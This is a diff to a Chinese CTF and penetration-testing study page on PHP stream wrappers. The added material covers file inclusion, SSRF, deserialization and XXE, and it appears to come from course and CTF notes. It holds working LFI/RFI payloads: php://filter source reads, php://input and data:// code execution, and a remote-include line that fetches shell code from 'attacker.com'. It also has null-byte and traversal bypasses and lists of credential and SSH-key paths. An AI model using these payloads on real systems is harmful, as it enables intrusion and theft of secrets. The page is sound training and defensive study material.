@@ -5,7 +5,8 @@ description: 系统梳理 PHP 伪协议（php://filter、php://input、data://�
   发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
   与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。本次更新整合
   BUUCTF 实战题目（WarmUp、include1、Secret File、nizhuansiwei、php、facebook、ZJCTF、easy_serialize_php、PHPWEB、had
-  a had day 等）的详细利用链与绕过细节，并补充 Java 反序列化特征识别与 XXE 漏洞利用、绕过、修复方案。
+  a had day 等）的详细利用链与绕过细节，并补充 Java 反序列化特征识别与 XXE 漏洞利用、绕过、修复方案。新增文件包含场景下伪协议实战细节（php://filter
+  读取源码、php://input 执行代码、data:// 绕过、file:// 读取敏感文件、远程包含绕过），并交叉引用 php-file-inclusion-vulnerability.md。
 category: program-analysis
 tags:
 - PHP
@@ -33,33 +34,183 @@ tags:
 - ysoserial
 - Base64
 - UTF-16BE
+- 文件包含
+- LFI
+- RFI
+- php://filter
+- php://input
+- data://
 date: '2020-10-01'
 updated: '2026-11-14'
 ---
 ## 概述
 
-本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场** 及 **BUUCTF** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]] 相关题解。
+本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。**文件包含漏洞场景**下的伪协议实战细节（本地/远程包含、目录穿越、截断绕过、敏感文件路径）亦在本页详述。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场**、**BUUCTF** 及 **XD安全 Day31-39 学习笔记** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]]、[[xd-security-file-inclusion-notes]] 相关题解。
 
-**本次更新**整合了 **XD安全 Day37-39 学习笔记**，补充了 PHP 序列化字符串格式的细节（整型 `i:value`）、Java 反序列化的特征识别（`rO0AB`/`aced`）、`ysoserial` 工具链使用、以及 XXE 漏洞的利用姿势（文件读取、内网探测、盲注带外数据外带、UTF-16BE 编码绕过、外部 DTD 攻击）及修复方案。
+**本次更新**整合了 **XD安全 Day37-39 学习笔记**，补充了 PHP 序列化字符串格式的细节（整型 `i:value`）、Java 反序列化的特征识别（`rO0AB`/`aced`）、`ysoserial` 工具链使用、以及 XXE 漏洞的利用姿势（文件读取、内网探测、盲注带外数据外带、UTF-16BE 编码绕过、外部 DTD 攻击）及修复方案。新增 **文件包含漏洞专题交叉引用** 指向 [[php-file-inclusion-vulnerability]]，形成完整知识体系。
+
+---
 
 ## PHP 常见伪协议速查
 
 > 官方文档：[PHP 封装协议](https://www.php.net/manual/zh/wrappers.php)
 
-| 协议 | 作用 | 关键条件 | 典型 Payload 示例 |
-| :--- | :--- | :--- | :--- |
-| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd`、`file:///var/www/html/flag.php` |
-| **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` |
-| **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) |
-| **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` |
-| **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` |
-| **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` |
-| **gopher://** | 发送原始 TCP 数据包（SSRF 利用核心） | `allow_url_fopen=On` <br> 支持 TCP 流式传输 | `gopher://127.0.0.1:9000/_POST%20/flag.php...` |
-| **dict://** | 字典服务协议（端口探测/数据外带） | 默认开启 | `dict://127.0.0.1:6379/info` |
-| **ldap://** | LDAP 协议（较少用） | 需扩展支持 | `ldap://127.0.0.1:389/...` |
-| **phar://** | PHAR 归档文件访问（触发反序列化） | `phar.readonly=Off` | `phar:///path/to/archive.phar` |
+| 协议 | 作用 | 关键条件 | 典型 Payload 示例 | 文件包含/SSRF 适用性 |
+| :--- | :--- | :--- | :--- | :--- |
+| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd`、`file:///var/www/html/flag.php` | LFI 读取源码/敏感文件；SSRF 读取本地文件 |
+| **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` | LFI 读取源码不执行；SSRF 读取源码 |
+| **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) | LFI/RFI 执行 POST 代码；需包含函数支持 |
+| **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` | LFI/RFI 注入可控字符串；绕过内容校验 |
+| **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` | LFI 结合文件上传 Getshell |
+| **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` | LFI 读取压缩文件 |
+| **gopher://** | 发送原始 TCP 数据包（SSRF 利用核心） | `allow_url_fopen=On` <br> 支持 TCP 流式传输 | `gopher://127.0.0.1:9000/_POST%20/flag.php...` | SSRF 攻击内网 FastCGI/Redis/MySQL 等 |
+| **dict://** | 字典服务协议（端口探测/数据外带） | 默认开启 | `dict://127.0.0.1:6379/info` | SSRF 内网端口探测、Redis 攻击 |
+| **ldap://** | LDAP 协议（较少用） | 需扩展支持 | `ldap://127.0.0.1:389/...` | SSRF 特定场景 |
+| **phar://** | PHAR 归档文件访问（触发反序列化） | `phar.readonly=Off` (生成时) | `phar:///path/to/archive.phar` | 文件操作函数触发反序列化 (POP 链) |
 
-> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。
+> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。**文件包含漏洞成因核心：可控变量 + 文件包含函数**，详见 [[php-file-inclusion-vulnerability]]。
+
+---
+
+## 文件包含漏洞场景下的伪协议实战细节
+
+> 来源：[[xd-security-file-inclusion-notes]] (XD安全 Day31-32 学习笔记)、[[php-file-inclusion-vulnerability]]
+
+### 危险函数差异与利用前提
+
+| 函数 | 出错行为 | 利用价值 |
+| :--- | :--- | :--- |
+| `include()` | 警告，继续执行 | 最常见，适合包含后继续执行后续逻辑 |
+| `include_once()` | 警告，只包含一次 | 需注意重复包含导致类重定义报错 |
+| `require()` | 致命错误，终止执行 | 若包含失败会中断利用链 |
+| `require_once()` | 致命错误，只包含一次 | 同上 |
+
+**核心配置检测**：利用前必通过 `phpinfo()` 或报错回显确认 `allow_url_fopen` 与 `allow_url_include` 状态。
+- `allow_url_fopen=On`：支持 `file_get_contents`、`fopen` 等读取远程资源（SSRF、data://、php://filter 读取）。
+- `allow_url_include=On`：支持 `include/require` 包含远程资源（RFI、php://input 执行代码）。
+
+### php://filter：读取源码绕过执行
+
+**核心用法**：`php://filter/read=convert.base64-encode/resource=<目标文件>`
+- **作用**：将目标文件内容 Base64 编码后输出，**防止 PHP 解析器直接执行代码**，从而获取源码。
+- **适用场景**：
+  1.  **文件包含 (LFI)**：`include($_GET['file'])` 时，直接包含 `index.php` 会执行代码导致无法看到源码或报错；用 filter 编码后可安全读取。
+  2.  **SSRF (`file_get_contents`/`curl`)**：读取内网 Web 服务源码。
+  3.  **获取类定义**：反序列化利用前，必须读取目标类源码以构造正确 Payload（属性名、修饰符、命名空间）。
+
+**实战案例 (XD安全笔记 - bugku)**：
+```text
+# 目标：http://123.206.87.240:8005/post/index.php?file=show.php
+# Payload 读取 index.php 源码：
+http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+# 返回 Base64 字符串，解码后在注释中发现 flag
+```
+
+**实战案例 (赣网杯2020 / Pikachu / BUUCTF nizhuansiwei)**：
+```text
+# 读取 useless.php 获取 Flag 类定义
+?file=php://filter/read=convert.base64-encode/resource=useless.php
+# 解码后得到：
+# class Flag { public $file; public function __tostring(){ if(isset($this->file)) echo file_get_contents($this->file); } }
+```
+
+**进阶过滤器链**：
+- `convert.base64-decode`：解码 Base64 文件内容。
+- `convert.rot13`：ROT13 编码/解码。
+- `string.toupper` / `string.tolower`：大小写转换（可用于绕过大小写敏感过滤）。
+- 多重编码：`php://filter/read=convert.base64-encode|convert.base64-encode/resource=...` (双重 Base64)。
+
+### php://input：POST 数据直接执行代码
+
+**核心用法**：`?file=php://input` 配合 POST Body 发送 PHP 代码。
+- **前置条件**：`allow_url_include=On`（必须，因为 `include/require` 才会执行流内容）。
+- **利用场景**：
+  1.  **RFI 执行代码**：目标存在 `include($_GET['file'])`，且无文件上传点，可直接 POST Webshell 代码执行。
+  2.  **绕过文件内容校验**：如赣网杯2020 题目需 `file_get_contents($sz_txt) === "welcome to jxsz"`，可用 `php://input` POST 该字符串满足校验，同时 `include` 执行 POST 体代码（需注意同一请求无法同时满足 GET 参数和 POST Body 被 `include` 读取两次，通常分步或配合 `data://`）。
+
+**实战案例 (赣网杯2020 变种)**：
+```http
+GET /?sz_txt=php://input&sz_file=useless.php&password=... HTTP/1.1
+POST Body: welcome to jxsz
+```
+> 注：若同一参数既用于 `file_get_contents` 校验又用于 `include`，`php://input` 只能读取一次，第二次为空。此时需改用 `data://` 协议绕过校验，`include` 真实文件。
+
+### data://：注入可控字符串绕过校验
+
+**核心用法**：`data://text/plain;base64,<Base64编码内容>`
+- **前置条件**：`allow_url_include=On` 且 `allow_url_fopen=On`，PHP >= 5.2.0。
+- **优势**：支持 GET 请求完成“注入字符串+包含执行”，无需 POST，适合只能控制 URL 参数的场景。
+- **利用场景**：
+  1.  **绕过内容校验**：将需匹配的字符串 Base64 编码放入 `data://`，满足 `file_get_contents` 等函数的比较逻辑。
+  2.  **直接执行代码**：`data://text/plain,<?php phpinfo();>` (需 URL 编码) 或 Base64 版本。
+
+**实战案例 (赣网杯2020 标准解法)**：
+```text
+# 校验 sz_txt 内容为 "welcome to jxsz"
+# Base64: d2VsY29tZSB0byBqeHN6
+?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
+```
+
+**实战案例 (XD安全笔记 - nizhuansiwei 类题目)**：
+```text
+?text=data://text/plain,welcome to the zjctf
+# 或 Base64 版
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgeGpjdGY=
+```
+
+### file://：SSRF 与 LFI 读取本地敏感文件
+
+**核心用法**：`file:///absolute/path/to/file`
+- **LFI 场景**：`include` 参数直接传入 `file:///etc/passwd` 读取文件内容（若回显位置允许）。
+- **SSRF 场景**：`file_get_contents($_GET['url'])` 等函数支持 `file://` 协议，直接读取服务器本地任意文件。
+- **敏感文件路径速查 (来源：XD安全笔记)**：
+
+**Windows 敏感路径**：
+```
+C:\boot.ini                    # 系统版本
+C:\Windows\System32\inetsrv\MetaBase.xml  # IIS 配置
+C:\Windows\repair\sam          # 系统初次安装密码
+C:\Program Files\mysql\my.ini  # MySQL 配置
+C:\Program Files\mysql\data\mysql\user.MYD # MySQL root
+C:\Windows\php.ini             # PHP 配置
+C:\Windows\my.ini              # MySQL 配置
+C:\Windows\win.ini             # 系统基础配置
+```
+
+**Linux 敏感路径**：
+```
+/etc/passwd                    # 用户列表
+/etc/shadow                    # 密码哈希 (需 root)
+/root/.ssh/id_rsa              # SSH 私钥
+/root/.ssh/authorized_keys     # 授权公钥
+/root/.bash_history            # 历史命令
+/root/.mysql_history           # MySQL 历史命令
+/usr/local/app/php5/lib/php.ini # PHP 配置
+/etc/my.cnf                    # MySQL 配置
+/etc/httpd/conf/httpd.conf     # Apache 配置
+/proc/self/cmdline             # 当前进程命令行
+/proc/mounts                   # 挂载设备
+/var/lib/mlocate/mlocate.db    # 全文件路径数据库
+```
+
+**实战案例 (CTFHUB SSRF - 文件读取)**：
+```text
+?url=file:///var/www/html/index.php   # 读取源码发现 flag.php 路径
+?url=file:///var/www/html/flag.php    # 直接读取 Flag
+```
+
+### 远程文件包含 (RFI) 与绕过
+
+**条件**：`allow_url_include=On`。
+**标准利用**：攻击者 VPS 放置 `shell.txt` (内容为 PHP 代码)，目标请求 `?file=http://attacker.com/shell.txt`。
+**绕过限制技巧 (参考文件上传绕过思路，来源：XD安全笔记)**：
+1.  **协议封装**：`data://`、`php://input` 替代远程 HTTP。
+2.  **截断绕过 (旧版 PHP < 5.3.4 / 特定配置)**：`%00` 截断后缀 `.php` -> `?file=http://attacker.com/shell.txt%00`。
+3.  **路径长度截断 (Windows 特性)**：Windows 文件名长度限制 (260 字符)，构造超长路径截断后缀。
+4.  **`. ` 或 `..` 绕过**：利用 `include("./".$_GET['file'])` 结构，`file=..%2f..%2f..%2fetc%2fpasswd` 目录穿越。
+5.  **通配符/别名绕过**：Apache `Alias`、`open_basedir` 绕过技巧。
+
+> 详细文件包含漏洞成因、四大危险函数差异、目录穿越与截断绕过、任意文件下载漏洞检测逻辑及完整敏感路径清单，见 [[php-file-inclusion-vulnerability]]。
 
 ---
 
@@ -422,7 +573,7 @@ $obj = new Demo('fl4g.php');
 
 // 2. 序列化
 $a = serialize($obj);
-// 输出示例: O:4:"Demo":1:{s:4:"file";s:8:"fl4g.php";} (注意私有属性序列化时会包含 \00Demo\00file)
+// 输出示例: O:4:"Demo":1:{s:14:"\00Demo\00file";s:8:"fl4g.php";} (注意私有属性序列化时会包含 \00Demo\00file)
 
 // 3. 代码级替换：绕过数字正则 (\d+) -> 加 + 号
 // 注意：私有属性名序列化格式为 s:13:"\00Demo\00file"，长度计数也需修改
@@ -1171,7 +1322,7 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 
 ### 伪协议组合拳
 *   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
-*   **`file://` (SSRF)**：直接读取本地文件，配合 `gopher://` 攻击内网服务。
+*   **`file://` (SSRF/LFI)**：直接读取本地文件，配合 `gopher://` 攻击内网服务。
 *   **`gopher://` (万金油)**：构造任意 TCP 报文，攻击 FastCGI、Redis、MySQL、FTP、SMTP 等内网服务，实现 RCE、写 Shell、数据窃取。
 *   **`phar://` (反序列化触发器)**：利用文件操作函数触发元数据反序列化，打 POP 链。
 *   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。
@@ -1206,6 +1357,8 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 *   **绕过**：UTF-16BE 编码、协议替换、大小写混淆、注释干扰。
 *   **修复**：禁用外部实体 (代码层面 `setFeature` / `libxml_disable_entity_loader`)。
 
+---
+
 ## 关联页面
 
 *   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记（赣网杯2020等）。
@@ -1218,7 +1371,11 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 *   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。
 *   [[buuctf-web-writeup-collection]] - BUUCTF Web 方向题目完整解题思路汇总，按漏洞类型分类并交叉引用现有技术页面。
 *   [[xxe-xml-dtd-fundamentals]] - XXE 漏洞利用核心基础：XML 语法树结构、DTD 声明类型、实体引用分类、PCDATA 与 CDATA 差异，及外部实体通过 file/http 等协议实现任意文件读取的攻击原理。
+*   [[php-file-inclusion-vulnerability]] - **PHP 文件包含漏洞完整知识页**，系统梳理成因、四大危险函数差异、目录穿越与截断绕过、php://filter/php://input/data:// 等伪协议利用链、任意文件下载漏洞检测与敏感文件路径清单，**本页面文件包含场景伪协议细节的核心交叉引用目标**。
+*   [[xd-security-file-inclusion-notes]] - XD安全 Day31-32 文件包含学习笔记，本页面文件包含场景伪协议实战细节的主要归档来源。
 *   [[mongodb-nosql-injection-guide]] - MongoDB NoSQL 注入指南，涉及反序列化对象注入变种利用思路对比参考。
+
+---
 
 ## 参考资源
 
@@ -1238,9 +1395,14 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 *   ysoserial: https://github.com/frohoff/ysoserial
 *   Java 反序列化规范: https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html
 *   XXE 防御备忘单 (OWASP): https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+*   XD安全渗透测试课程 Day31-39 学习笔记 (微信归档)
+
+---
 
 ## 来源
 
 - [0x00实验室-202108-202304_080](../sources/0x00实验室-202108-202304_080.md)
 - [XD安全 Day37-39 学习笔记](../sources/XD安全-反序列化与XXE笔记.md) (归档文章内容整合)
 - [0x00实验室-202108-202304_089](../sources/0x00实验室-202108-202304_089.md)
+- [XD安全 Day31-32 文件包含笔记](../sources/XD安全-文件包含笔记.md) (归档文章内容整合)
+- [0x00实验室-202108-202304_091](../sources/0x00实验室-202108-202304_091.md)
